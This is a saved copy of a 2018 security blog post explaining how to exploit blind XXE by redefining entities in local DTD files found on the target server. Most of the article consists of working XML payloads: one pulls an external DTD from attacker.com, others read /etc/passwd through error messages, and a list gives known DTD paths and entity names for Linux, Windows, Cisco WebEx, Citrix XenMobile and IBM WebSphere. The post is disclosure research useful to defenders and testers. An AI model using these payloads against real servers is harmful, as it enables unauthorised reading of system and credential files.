<!DOCTYPE html>
<!-- saved from url=(0060)https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/ -->
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">



<link rel="icon" href="https://mohemiv.com/favicon.ico" type="image/x-icon">
<link rel="shortcut icon" href="https://mohemiv.com/favicon.ico" type="image/x-icon"> 


<meta name="format-detection" content="telephone=no">
<!--<base href="https://mohemiv.com/">--><base href=".">

<link rel="stylesheet" type="text/css" href="./Exploiting XXE with local DTD files_files/main.css">

<link rel="alternate" type="application/rss+xml" title="Arseniy Sharoglazov" href="https://mohemiv.com/rss/">
<link rel="alternate" type="application/json" title="Arseniy Sharoglazov" href="https://mohemiv.com/json/">

<link rel="index" id="link-index" href="https://mohemiv.com/">
<link rel="prev" id="link-prev" href="https://mohemiv.com/all/evil-xml/">

<meta name="robots" content="index, follow">

<meta name="description" content="This little technique can force your blind XXE to output anything you want!">
<meta name="og:description" content="This little technique can force your blind XXE to output anything you want!">

<meta property="og:image" content="/pictures/exploiting-xxe-with-local-dtd-files/preview.png">

<meta name="twitter:card" content="summary">

<meta name="twitter:image" content="https://mohemiv.com/pictures/exploiting-xxe-with-local-dtd-files/preview.png">

<meta name="viewport" content="width=device-width, initial-scale=1">

<title>Exploiting XXE with local DTD files</title>
<meta name="og:title" content="Exploiting XXE with local DTD files">

<meta name="og:url" content="">




<script type="text/javascript" async="" src="./Exploiting XXE with local DTD files_files/tag.js"></script><script type="text/javascript">
document.e2 = document.e2 || {}
document.e2.serverTime = 1560959029 
document.e2.cookiePrefix = '_'
</script>

<script type="text/javascript" src="./Exploiting XXE with local DTD files_files/jquery.js"></script>
<script type="text/javascript" src="./Exploiting XXE with local DTD files_files/pseudohover.js"></script>
<script type="text/javascript" src="./Exploiting XXE with local DTD files_files/smart-title.js"></script>
<script type="text/javascript" src="./Exploiting XXE with local DTD files_files/main.js"></script>
<script type="text/javascript" src="./Exploiting XXE with local DTD files_files/highlight.js"></script>



<style id="search-field__input">.search-field { --searchFieldMaxWidth: 240px; } .search-field__input { max-width: 1457.296875px; }</style></head>

<body>


<a id="e2-check-password-action" href="https://mohemiv.com/@ajax/check-password/"></a>
  
<div class="
    e2-login-sheet
    e2-hideable      " id="e2-login-sheet">

<div class="e2-login-window" id="e2-login-window">
  <div class="e2-login-window-col">
    <form action="https://mohemiv.com/@actions/sign-in/" method="post" class="form-login e2-enterable" id="form-login">

      <input type="text" name="login" value="Arseniy Sharoglazov" style="display: none">

              <!-- <h1>Your password</h1> -->
        <h2>Your password</h2>
            
      <div class="e2-login-window-input-wrapper">
        <span class="e2-login-window-icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16"><path fill-rule="evenodd" stroke="none" clip-rule="evenodd" d="M11 6h-1V4a4 4 0 0 0-8 0v2H1C0 6 0 7 0 7v7.999C0 15.998 1 16 1 16h10s1 0 1-1V7s0-1-1-1zM8 6H4V4a2 2 0 0 1 4 0v2z"></path></svg></span>
        <input type="password" name="password" id="e2-password" class="text big input-disableable e2-login-window-input" autofocus="autofocus">
      </div>
        
      <label><input type="checkbox" class="checkbox input-disableable" name="is_public_pc" id="is_public_pc">&nbsp;Public computer</label>

      <div class="e2-login-window-button">
        <button type="submit" id="login-button" class="e2-submit-button input-disableable">
          Sign in        </button>
        &nbsp;&nbsp;&nbsp;
        <span class="e2-svgi" id="password-checking" style="display: none"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 100 100"><circle id="e2-progress" r="39" cx="50" cy="50" transform="rotate(61.1654 50 50)" stroke-width="6" fill="none" stroke-dasharray="245" stroke-dashoffset="61" style="transition:stroke-dashoffset .5s ease-out"><animatetransform attributeName="transform" type="rotate" from="0 50 50" to="360 50 50" dur="1333ms" repeatCount="indefinite"></animatetransform></circle></svg></span><span id="password-correct" class="e2-svgi" style="display: none"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 16 16"><path stroke="none" d="M1 9.034l4.517 5.547L15 2.42V.92L5.526 13.157 1 7.646z"></path></svg></span>
      </div>
    </form>
  </div>
</div>

</div>

<div class="common">



<div class="flag">
  
<script async="" src="./Exploiting XXE with local DTD files_files/js"></script>
<script>window.dataLayer = window.dataLayer || [];function gtag(){dataLayer.push(arguments);};gtag('js', new Date());gtag('config', 'UA-112827575-1');</script>
<script type="text/javascript"> (function (d, w, c) { (w[c] = w[c] || []).push(function() { try { w.yaCounter47388028 = new Ya.Metrika2({ id:47388028, clickmap:true, trackLinks:true, accurateTrackBounce:true, webvisor:true, ut:"noindex" }); } catch(e) { } }); var n = d.getElementsByTagName("script")[0], s = d.createElement("script"), f = function () { n.parentNode.insertBefore(s, n); }; s.type = "text/javascript"; s.async = true; s.src = "https://cdn.jsdelivr.net/npm/yandex-metrica-watch/tag.js"; if (w.opera == "[object Opera]") { d.addEventListener("DOMContentLoaded", f, false); } else { f(); } })(document, window, "yandex_metrika_callbacks2"); </script> <noscript><div><img src="https://mc.yandex.ru/watch/47388028?ut=noindex" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

  <div class="header-content">

    <div class="header-description">

      <div class="title">

        <div class="title-inner">

          <div class="logo-marginal">
            
<div class="e2-user-picture-container">
  <a href="https://mohemiv.com/" class="nu"><img src="./Exploiting XXE with local DTD files_files/userpic@2x.jpg" alt=""></a> 
</div>

          </div>

          <div class="logo">
            
<div class="e2-user-picture-container">
  <a href="https://mohemiv.com/" class="nu"><img src="./Exploiting XXE with local DTD files_files/userpic@2x.jpg" alt=""></a> 
</div>

          </div>

          <h1>
            <a href="https://mohemiv.com/" class=""><span id="e2-blog-title">Arseniy Sharoglazov</span></a>          </h1>

        </div>

              </div>
    </div>

    <div class="spotlight">
      <span class="admin-links admin-links-floating">
              </span>

              <form id="e2-search" class="search-field search-field-right-anchored e2-enterable" action="https://mohemiv.com/@actions/search/" method="post" accept-charset="utf-8">
  <label class="search-field__label">
    <input class="search-field__input" type="text" name="query" id="query" value="">
    
    <div class="search-field__zoom-icon"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 16 16"><path stroke="none" fill-rule="evenodd" clip-rule="evenodd" d="M16 14.5l-4.399-4.399a6.212 6.212 0 0 0 1.148-3.602 6.25 6.25 0 1 0-12.5 0 6.25 6.25 0 0 0 6.251 6.25 6.212 6.212 0 0 0 3.602-1.148L14.5 16l1.5-1.5zM1.25 6.501a5.251 5.251 0 1 1 10.502 0 5.251 5.251 0 0 1-10.502 0z"></path></svg></div>
    
          <a class="nu search-field__tags-icon" href="https://mohemiv.com/tags/" title="Tags">
        <span class="e2-svgi"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 16 16"><path stroke="none" d="M6.938 16.001c-.43 0-.891-.16-1.32-.59L.607 10.38C-.406 9.367.037 8.191.581 7.647l6.538-6.501C7.145 1.116 8.176 0 9.427 0h4.044c1.153 0 2.5.659 2.5 2.516v3.991c0 1.167-1.029 2.229-1.146 2.347L8.32 15.415c-.308.309-.818.586-1.382.586zM9.427 1c-.801 0-1.578.828-1.586.837L1.287 8.354c-.146.152-.587.706.027 1.319l5.011 5.031c.589.59 1.137.15 1.29.003l6.501-6.559c.238-.241.855-1.002.855-1.642v-3.99c0-1.318-.94-1.516-1.5-1.516H9.427zm1.571 5.754c-.468 0-.907-.183-1.238-.515a1.765 1.765 0 0 1 0-2.487c.661-.664 1.814-.664 2.475 0 .331.332.513.774.513 1.243 0 .469-.182.911-.513 1.243a1.73 1.73 0 0 1-1.237.516z"></path></svg></span>
      </a>
      </label>

</form>
       
    </div>

  </div>

  </div>



<div class="content">





<div id="e2-note-7" class="e2-only e2-note   ">




<article>



<h1 class="e2-published e2-smart-title">
<a href="https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/" class="">Exploiting XXE with local DTD files</a> 
</h1>




<div class="e2-note-text e2-text e2-published">
<p>This little technique can force your blind XXE to&nbsp;output anything you want!</p>
<p><img src="./Exploiting XXE with local DTD files_files/preview.png" alt="Preview" style="width: 100%;"></p>
<h2>Why do we have trouble exploiting XXE in&nbsp;2k18?</h2>
<p>Imagine you have an&nbsp;XXE. External entities are supported, but&nbsp;the&nbsp;server’s response is always empty. In&nbsp;this case you have two options: <b>error-based</b> and&nbsp;<b>out-of-band</b> exploitation.</p>
<style>
.e2-text .dtd1 th, .e2-text .dtd1 td {
padding: 0 0 0 0;
}
</style>
<p>Consider this error-based example:</p>
<table class="dtd1"><tbody><tr><td style="width: 800px;"><p><b>Request</b></p>
</td><td style="width: 40%;"><p><b>Response</b></p>
</td></tr><tr><td><pre><code class="hljs xml"><span class="php"><span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">"1.0"</span> <span class="hljs-meta">?&gt;</span></span>
<span class="hljs-meta">&lt;!DOCTYPE message [
    &lt;!ENTITY % ext SYSTEM "http://attacker.com/ext.dtd"&gt;
    %ext;
]&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">message</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">message</span>&gt;</span></code>
</pre>
</td><td><p>java.io.FileNotFoundException: /nonexistent/<br>
<span style="background: #D9FFAD;">root:x:0:0:root:/root:/bin/bash<br>
bin:x:1:1:bin:/bin:/usr/bin/nologin<br>
daemon:x:2:2:daemon:/:/usr/bin/nologin<br>
</span><br>
(No&nbsp;such file or&nbsp;directory)</p>
</td></tr></tbody></table><p><b>Contents of&nbsp;ext.dtd</b></p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">!ENTITY</span> % <span class="hljs-attr">file</span> <span class="hljs-attr">SYSTEM</span> "<span class="hljs-attr">file:</span>///<span class="hljs-attr">etc</span>/<span class="hljs-attr">passwd</span>"&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">!ENTITY</span> % <span class="hljs-attr">eval</span> "&lt;!<span class="hljs-attr">ENTITY</span> &amp;#<span class="hljs-attr">x25</span>; <span class="hljs-attr">error</span> <span class="hljs-attr">SYSTEM</span> '<span class="hljs-attr">file:</span>///<span class="hljs-attr">nonexistent</span>/%<span class="hljs-attr">file</span>;'&gt;</span>"&gt;
%eval;
%error;</code>
</pre>
<p>See? You are using an&nbsp;external server for&nbsp;payload delivery. What can you do if there is a&nbsp;firewall between you and&nbsp;the&nbsp;target server? Nothing!</p>
<p>What if we just put external DTD content directly in&nbsp;the&nbsp;DOCTYPE? Some errors will always appear:</p>
<table class="dtd1"><tbody><tr style="width: 800px;"><td style="width: 60%;"><p><b>Request</b></p>
</td><td style="width: 40%;"><p><b>Response</b></p>
</td></tr><tr><td><pre><code class="hljs xml"><span class="php"><span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">"1.0"</span> <span class="hljs-meta">?&gt;</span></span>
<span class="hljs-meta">&lt;!DOCTYPE message [
    &lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;
    &lt;!ENTITY % eval "&lt;!ENTITY &amp;#x25; error SYSTEM 'file:///nonexistent/%file;'&gt;"&gt;
    %eval;
    %error;
]&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">message</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">message</span>&gt;</span>
</code>
</pre>
</td><td><p>Internal Error: SAX Parser Error. Detail:<br>
The&nbsp;parameter entity reference “%file;” cannot occur within markup in&nbsp;the&nbsp;internal subset of&nbsp;the&nbsp;DTD.</p>
</td></tr></tbody></table><p>External DTD allows us to&nbsp;include one entity inside the&nbsp;second, but&nbsp;it is prohibited in&nbsp;the&nbsp;internal DTD.</p>
<h2>What can we do with internal DTD?</h2>
<p>To&nbsp;use external DTD syntax in&nbsp;the&nbsp;internal DTD subset, you can bruteforce a&nbsp;local dtd file on&nbsp;the&nbsp;target host and&nbsp;redefine some parameter-entity references inside it:</p>
<table class="dtd1"><tbody><tr><td style="width: 800px;"><p><b>Request</b></p>
</td><td style="width: 40%;"><p><b>Response</b></p>
</td></tr><tr><td><pre><code class="hljs xml"><span class="php"><span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">"1.0"</span> <span class="hljs-meta">?&gt;</span></span>
<span class="hljs-meta">&lt;!DOCTYPE message [
    &lt;!ENTITY % local_dtd SYSTEM "file:///opt/IBM/WebSphere/AppServer/properties/sip-app_1_0.dtd"&gt;

    &lt;!ENTITY % condition '</span><span style="background: #D9FFAD;"><span class="hljs-meta">aaa)&gt;
        &lt;!ENTITY &amp;#x25; file SYSTEM "file:///etc/passwd"&gt;
        &lt;!ENTITY &amp;#x25; eval "&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;"&gt;
        &amp;#x25;eval;
        &amp;#x25;error;
        &lt;!ELEMENT aa (bb</span></span><span class="hljs-meta">'&gt;

    %local_dtd;
]&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">message</span>&gt;</span>any text<span class="hljs-tag">&lt;/<span class="hljs-name">message</span>&gt;</span>
</code>
</pre>
</td><td><p>java.io.FileNotFoundException: /nonexistent/<br>
<span style="background: #D9FFAD;">root:x:0:0:root:/root:/bin/bash<br>
bin:x:1:1:bin:/bin:/usr/bin/nologin<br>
daemon:x:2:2:daemon:/:/usr/bin/nologin<br>
</span><br>
(No&nbsp;such file or&nbsp;directory)</p>
</td></tr></tbody></table><p><b>Contents of&nbsp;sip-app_1_0.dtd</b></p>
<pre><code class="hljs xml">…
<span class="hljs-tag">&lt;<span class="hljs-name">!ENTITY</span> % <span class="hljs-attr">condition</span> "<span class="hljs-attr">and</span> | <span class="hljs-attr">or</span> | <span class="hljs-attr">not</span> | <span class="hljs-attr">equal</span> | <span class="hljs-attr">contains</span> | <span class="hljs-attr">exists</span> | <span class="hljs-attr">subdomain-of</span>"&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">!ELEMENT</span> <span class="hljs-attr">pattern</span> (%<span class="hljs-attr">condition</span>;)&gt;</span>
…</code>
</pre>
<p>It works because all XML entities are constant. If you define two entities with the&nbsp;same name, only the&nbsp;first one will be used.</p>
<h2>How can we find a&nbsp;local dtd file?</h2>
<p>Nothing is easier than enumerating files and&nbsp;directories. Below are a&nbsp;few more examples of&nbsp;successful applications of&nbsp;this trick:<br>
</p><h3>Custom Linux System</h3><p></p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">!ENTITY</span> % <span class="hljs-attr">local_dtd</span> <span class="hljs-attr">SYSTEM</span> "<span class="hljs-attr">file:</span>///<span class="hljs-attr">usr</span>/<span class="hljs-attr">share</span>/<span class="hljs-attr">yelp</span>/<span class="hljs-attr">dtd</span>/<span class="hljs-attr">docbookx.dtd</span>"&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">!ENTITY</span> % <span class="hljs-attr">ISOamsa</span> '</span><span style="background: #D9FFAD;"><span class="hljs-tag"><span class="hljs-attr">Your</span> <span class="hljs-attr">DTD</span> <span class="hljs-attr">code</span></span></span><span class="hljs-tag">'&gt;</span>
%local_dtd;</code>
</pre>
<p></p><h3>Custom Windows System</h3><p></p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">!ENTITY</span> % <span class="hljs-attr">local_dtd</span> <span class="hljs-attr">SYSTEM</span> "<span class="hljs-attr">file:</span>///<span class="hljs-attr">C:</span>\<span class="hljs-attr">Windows</span>\<span class="hljs-attr">System32</span>\<span class="hljs-attr">wbem</span>\<span class="hljs-attr">xml</span>\<span class="hljs-attr">cim20.dtd</span>"&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">!ENTITY</span> % <span class="hljs-attr">SuperClass</span> '</span><span style="background: #D9FFAD;"><span class="hljs-tag">&gt;</span>Your DTD code<span class="hljs-tag">&lt;<span class="hljs-name">!ENTITY</span> <span class="hljs-attr">test</span> "<span class="hljs-attr">test</span>"</span></span><span class="hljs-tag">'&gt;</span>
%local_dtd;</code>
</pre>
<p>Thanks to&nbsp;@Mike_n1 from Positive Technologies for&nbsp;sharing this path of&nbsp;always-existing Windows DTD file.</p><h3>Cisco WebEx</h3><h3><p></p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">!ENTITY</span> % <span class="hljs-attr">local_dtd</span> <span class="hljs-attr">SYSTEM</span> "<span class="hljs-attr">file:</span>///<span class="hljs-attr">usr</span>/<span class="hljs-attr">share</span>/<span class="hljs-attr">xml</span>/<span class="hljs-attr">scrollkeeper</span>/<span class="hljs-attr">dtds</span>/<span class="hljs-attr">scrollkeeper-omf.dtd</span>"&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">!ENTITY</span> % <span class="hljs-attr">url.attribute.set</span> '</span><span style="background: #D9FFAD;"><span class="hljs-tag">&gt;</span>Your DTD code<span class="hljs-tag">&lt;<span class="hljs-name">!ENTITY</span> <span class="hljs-attr">test</span> "<span class="hljs-attr">test</span>"</span></span><span class="hljs-tag">'&gt;</span>
%local_dtd;</code>
</pre>
<p></p></h3><h3>Citrix XenMobile Server</h3><p></p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">!ENTITY</span> % <span class="hljs-attr">local_dtd</span> <span class="hljs-attr">SYSTEM</span> "<span class="hljs-attr">jar:file:</span>///<span class="hljs-attr">opt</span>/<span class="hljs-attr">sas</span>/<span class="hljs-attr">sw</span>/<span class="hljs-attr">tomcat</span>/<span class="hljs-attr">shared</span>/<span class="hljs-attr">lib</span>/<span class="hljs-attr">jsp-api.jar</span>!/<span class="hljs-attr">javax</span>/<span class="hljs-attr">servlet</span>/<span class="hljs-attr">jsp</span>/<span class="hljs-attr">resources</span>/<span class="hljs-attr">jspxml.dtd</span>"&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">!ENTITY</span> % <span class="hljs-attr">Body</span> '</span><span style="background: #D9FFAD;"><span class="hljs-tag">&gt;</span>Your DTD code<span class="hljs-tag">&lt;<span class="hljs-name">!ENTITY</span> <span class="hljs-attr">test</span> "<span class="hljs-attr">test</span>"</span></span><span class="hljs-tag">'&gt;</span>
%local_dtd;</code>
</pre>
<p></p><h3>Custom Multi-Platform IBM WebSphere Application</h3><p></p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">!ENTITY</span> % <span class="hljs-attr">local_dtd</span> <span class="hljs-attr">SYSTEM</span> "<span class="hljs-attr">.</span>/<span class="hljs-attr">..</span>/<span class="hljs-attr">..</span>/<span class="hljs-attr">properties</span>/<span class="hljs-attr">schemas</span>/<span class="hljs-attr">j2ee</span>/<span class="hljs-attr">XMLSchema.dtd</span>"&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">!ENTITY</span> % <span class="hljs-attr">xs-datatypes</span> '</span><span style="background: #D9FFAD;"><span class="hljs-tag"><span class="hljs-attr">Your</span> <span class="hljs-attr">DTD</span> <span class="hljs-attr">code</span></span></span><span class="hljs-tag">'&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">!ENTITY</span> % <span class="hljs-attr">simpleType</span> "<span class="hljs-attr">a</span>"&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">!ENTITY</span> % <span class="hljs-attr">restriction</span> "<span class="hljs-attr">b</span>"&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">!ENTITY</span> % <span class="hljs-attr">boolean</span> "(<span class="hljs-attr">c</span>)"&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">!ENTITY</span> % <span class="hljs-attr">URIref</span> "<span class="hljs-attr">CDATA</span>"&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">!ENTITY</span> % <span class="hljs-attr">XPathExpr</span> "<span class="hljs-attr">CDATA</span>"&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">!ENTITY</span> % <span class="hljs-attr">QName</span> "<span class="hljs-attr">NMTOKEN</span>"&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">!ENTITY</span> % <span class="hljs-attr">NCName</span> "<span class="hljs-attr">NMTOKEN</span>"&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">!ENTITY</span> % <span class="hljs-attr">nonNegativeInteger</span> "<span class="hljs-attr">NMTOKEN</span>"&gt;</span>
%local_dtd;</code>
</pre>
<h2>Timeline</h2>
<pre class="e2-text-code"><code class="hljs ruby"><span class="hljs-number">01</span>/<span class="hljs-number">01</span>/<span class="hljs-number">2016</span> — Discovering the technique
<span class="hljs-number">12</span>/<span class="hljs-number">12</span>/<span class="hljs-number">2018</span> — Writing the article <span class="hljs-symbol">:D</span>
<span class="hljs-number">13</span>/<span class="hljs-number">12</span>/<span class="hljs-number">2018</span> — Full disclosure</code></pre></div>

</article>





<div class="e2-note-likes">

</div>



<div class="e2-note-tags">
<span class="e2-timestamp" title="13 December 2018, 20:35, GMT+03:00">2018</span> &nbsp;
<a href="https://mohemiv.com/tags/dtd/" class="e2-tag">DTD</a> &nbsp; <a href="https://mohemiv.com/tags/oob/" class="e2-tag">OOB</a> &nbsp; <a href="https://mohemiv.com/tags/waf/" class="e2-tag">WAF</a> &nbsp; <a href="https://mohemiv.com/tags/xml/" class="e2-tag">XML</a> &nbsp; <a href="https://mohemiv.com/tags/xxe/" class="e2-tag">XXE</a></div>





</div>




<div class="e2-note-list e2-text">
</div>


<div class="e2-pages">
<div class="e2-pages-prev-next">

<div class="e2-pages-prev"><a href="https://mohemiv.com/all/evil-xml/">Evil XML with two encodings</a></div><div class="e2-pages-between">←<span class="e2-keyboard-shortcut">Ctrl</span><span class="e2-page-unavailable">→</span></div><div class="e2-pages-next"><span class="unavailable"></span></div>

</div>
</div>











  

</div>




<div class="footer">
<div style=" display:inline-block; width: auto; vertical-align:middle; margin-top:-20px; margin-bottom: 40px;  border: 1px solid #D9D9D9; border-radius: .7em;"><a style="text-decoration: none; font-size: 18px; color: black; padding: 10px; display:inline-block;" href="https://twitter.com/_mohemiv" class=""><img style="vertical-align:middle;" src="./Exploiting XXE with local DTD files_files/twitter.png" height="40">Subscribe to new articles</a></div>
<br>
<span id="e2-blog-author">2018—2019, © Arseniy Sharoglazov, Creative Commons Attribution-NonCommercial-ShareAlike 4.0 International</span>

<a class="e2-rss-button" href="https://mohemiv.com/rss/">RSS</a>

<div class="engine">
<span title="E2 ">Powered by <a href="http://blogengine.me/" class="nu"><u>Aegea</u>&nbsp;<span class="e2-svgi"><svg id="Слой_1" xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 32 32"><path fill-rule="evenodd" clip-rule="evenodd" d="M30.674 23.666c-3.088 5.904-12.169 10.445-20.277 7.313-1.482-.573-3.709-.478-5.3-1.794-1.616-1.336-1.724-3.301-2.422-4.409-3.758-5.963-2.902-13.47.025-18.003C6.547.816 15.82-.531 23.298 3.826c7.477 4.357 10.48 13.904 7.376 19.84zM22.666 4.741C16.286.647 6.68 2.3 3.711 7.833c-2.7 5.032-.013 13.225 7.464 17.583 7.479 4.356 15.47 3.562 18.5-2.447 2.897-5.746-.051-13.763-7.009-18.228zm-2.695 11.171c-.731-.468-.918-1.25.138-1.65.765-.291 4.051-1.271 5.974-1.851.427-.128 1.101-.133 1.587.256 1.61 1.283 2.196 5.594.737 7.865-.337.524-1.116.518-1.651.136-2.113-1.505-6.099-4.315-6.785-4.756zm-1.754-4.197c.019-.904.143-5.073.178-5.586.044-.656.562-.851 1.283-.881 2.078-.087 5.48 2.535 6.146 4.546.284.859-.21 1.358-.808 1.562a271.793 271.793 0 0 1-5.349 1.716c-.814.251-1.472-.208-1.45-1.357zm-9.284 6.666c1.742-.755 6.02-2.299 6.67-2.555.486-.192 1.044.31 1.034.924-.017.958-.244 5.146-.334 7.134-.039.864-.543 1.153-1.459 1.071-2.591-.233-5.901-2.468-6.539-4.902-.234-.896.179-1.477.628-1.672zm8.055-6.536c-.021.846-.787.842-1.427.34-.605-.475-4.481-3.609-6.367-5.093-.504-.395-.508-1.114-.139-1.533 1.308-1.485 5.064-2.103 7.116-1.224.658.281.951.753.945 1.264-.017 1.603-.1 5.174-.128 6.246zm-2.223 2.897c-.824.319-6.743 2.44-7.326 2.614-.8.236-1.26.015-1.663-.404-1.576-1.64-1.669-7.936.767-9.131.523-.257 1.045-.173 1.326.027.281.2 6.277 4.754 7.188 5.506.404.334.396 1.122-.292 1.388zm4.39 2.137c.508.394 4.744 3.436 6.789 5.03.636.496.846 1.222.561 1.872-1.06 2.422-5.861 3.161-7.895 2.271-.846-.371-.923-.87-.908-1.812.031-2.188.16-5.93.146-6.589-.023-1.116.673-1.263 1.307-.772z" stroke="none"></path></svg></span></a></span></div>

<a class="e2-visual-login nu" id="e2-visual-login" href="https://mohemiv.com/sign-in/" style="opacity: 0.25;"><span class="e2-admin-link e2-svgi"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16"><path fill-rule="evenodd" stroke="none" clip-rule="evenodd" d="M11 6h-1V4a4 4 0 0 0-8 0v2H1C0 6 0 7 0 7v7.999C0 15.998 1 16 1 16h10s1 0 1-1V7s0-1-1-1zM8 6H4V4a2 2 0 0 1 4 0v2z"></path></svg></span></a>

</div>




</div>









<!-- Aegea  -->
</body></html>